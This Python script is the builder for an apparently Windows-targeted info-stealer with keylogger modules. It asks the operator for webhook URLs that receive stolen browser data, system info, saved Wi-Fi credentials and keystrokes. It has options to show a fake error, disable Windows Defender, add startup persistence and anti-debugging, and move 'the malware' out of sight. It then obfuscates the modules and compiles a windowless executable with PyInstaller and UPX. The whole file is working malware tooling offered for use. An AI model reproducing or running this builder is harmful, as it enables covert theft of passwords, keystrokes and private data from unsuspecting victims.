import subprocess
import os
import shutil
from colorama import Fore, Style
import sys
import time
import requests
from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn


def create_env(dir):
    progress.start()
    task = progress.add_task("Creating env...", total=1)
    files = ["main.py", "modules/browser.py", "modules/antidebug.py", "modules/info.py", "modules/wifi.py", "modules/startup.py", "modules/keylogger.py"]
    path = os.path.join(os.getcwd(), dir)
    
    if not os.path.exists(path):
        progress.stop()
        print(f"[-] Failed to make build env please make sure that you have source code in '{path}' folder!")
        time.sleep(3)
        sys.exit(1)
        
    os.mkdir(os.path.join(os.getcwd(), "build", "modules"))
    
    for file in files:
        try:
            shutil.copyfile(f"{path}/{file}", f"build/{file}")
        except:
            progress.stop()
            print(f"[-] Failed to make build env please make sure that you have source code in '{path}' folder!")
            time.sleep(3)
            sys.exit(1)
    
    progress.update(task, advance=1)


def obfuscate():
    task1 = progress.add_task("Obfuscating...", total=1)
    try:
        subprocess.run(f"pyminifier -o build/main.py build/main.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# main.py
        subprocess.run(f"pyminifier -o build/modules/browser.py build/modules/browser.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/browser.py
        subprocess.run(f"pyminifier -o build/modules/info.py build/modules/info.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/info.py
        subprocess.run(f"pyminifier -o build/modules/startup.py build/modules/startup.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/startup.py
        subprocess.run(f"pyminifier -o build/modules/antidebug.py build/modules/antidebug.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/antidebug.py
        subprocess.run(f"pyminifier -o build/modules/wifi.py build/modules/wifi.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/wifi.py
        subprocess.run(f"pyminifier -o build/modules/keylogger.py build/modules/keylogger.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/keylogger.py
        progress.update(task1, advance=1)
    except:
        progress.stop()
        print("[-] To obfuscate please install pyminifier or disable obfuscation from building options!")
        time.sleep(3)
        sys.exit(1)
    

def build(path, icon, upx=True, obf=True):
    create_env(path)
    if obf: obfuscate()
    task2 = progress.add_task("Compiling...", total=1)
    
    if upx:
        UpxArg = "--upx-dir C:/UPX"
    else:
        UpxArg = ""
    
    try:
        subprocess.run(f"pyinstaller  --onefile -w -i {icon} --clean {UpxArg} build/main.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
        try:
            shutil.rmtree(os.path.join(os.getcwd(), "build"))
            os.remove(os.path.join(os.getcwd(), "main.spec"))
        except: 
            pass
        progress.update(task2, advance=1)
        progress.stop()
        print(Fore.GREEN +"[+] All done!"+ Style.RESET_ALL)
        time.sleep(3)
    except:
        progress.stop()
        print(Fore.RED +"[-] Please make sure you have pyinstaller, pyminifier and UPX installed under C:/UPX!"+ Style.RESET_ALL)
        time.sleep(3)
        sys.exit(1)
    
    
def convert(value, name):
    if value.lower() == "y":
        return True
    elif value.lower() == "n":
        return False
    else:
        print(Fore.RED +f"[-] Choice for {name} is invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
        time.sleep(3)
        sys.exit(0)


def config(webhook, webhook_keylogger, interval, startup, keylogger, error, antidebug, defender, move):    
    config = f"WEBHOOK = '{webhook}'\nWEBHOOK_KEYLOGGER = '{webhook_keylogger}'\nINTERVAL = {interval}\nSTARTUP = {startup}\nKEYLOGGER = {keylogger}\nERROR = {error}\nANTIDEBUG = {antidebug}\nDEFENDER = {defender}\nMOVE = {move}"
    build_dir = os.path.join(os.getcwd(), "build")

    
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)
        os.mkdir(build_dir)
    else:
        os.mkdir(build_dir)
    
    with open(f"build\config.py", "w") as f:
        f.write(config)


def validate(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return
        else:
            print(Fore.RED +"Webhook URL is invalid!"+ Style.RESET_ALL)
            time.sleep(3)
            sys.exit(0)
    except:
        print(Fore.RED +"Webhook URL is invalid!"+ Style.RESET_ALL)
        time.sleep(3)
        sys.exit(0)


progress = Progress(
    TextColumn("[bold blue]{task.description}", justify="right"),
    BarColumn(bar_width=None),
    SpinnerColumn(style="bold", spinner_name="simpleDotsScrolling", speed=1),
    TimeElapsedColumn()
)


webhook = input("[?] Enter webhook URL for browser info, system info and saved wifi: ")
validate(webhook)
error = input("[?] Enable fake error? [Y/n]: ")
defender = input("[?] Enable win defender disabler? [Y/n]: ")
startup  = input("[?] Enable startup? [Y/n]: ")
antidebug = input("[?] Enable antidebug? [Y/n]: ")
move = input("[?] Move the malware to the special location? [Y/n]: ")

keylogger = input("[?] Enable keylogger? [Y/n]: ")
if keylogger.lower() == "y":
    keylogger_webhook = input("[?] Enter webhook URL for keylogger: ")
    validate(keylogger_webhook)
    interval = input("[?] Enter interval for keylogger sending (in secondes): ")
else:
    keylogger_webhook = "null"
    interval = 0
    

choice = input("> Do you want to edit building options[y/N]: ")
if choice.lower() == "y":
    obf = input("[?] Do you want to enable obfuscation? [Y/n]: ")
    upx = input("[?] Use UPX? [Y/n]: ")
    icon = input("[?] Enter icon file: ")
    path = input("[?] Enter source code directory: ")
    
    config(webhook, keylogger_webhook, interval, convert(startup, "startup"), convert(keylogger, "keylogger"), convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move to dedicated location"))
    build(path, icon, convert(upx, "UPX"), convert(obf, "obfuscation"))
    
elif choice.lower() == "n":
    config(webhook, keylogger_webhook, interval, convert(startup, "startup"), convert(keylogger, "keylogger"), convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move to dedicated location"))
    build("src", "icon.ico")
    
else:
    print(Fore.RED +"[-] Your choice was invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
    time.sleep(3)
    sys.exit(0)
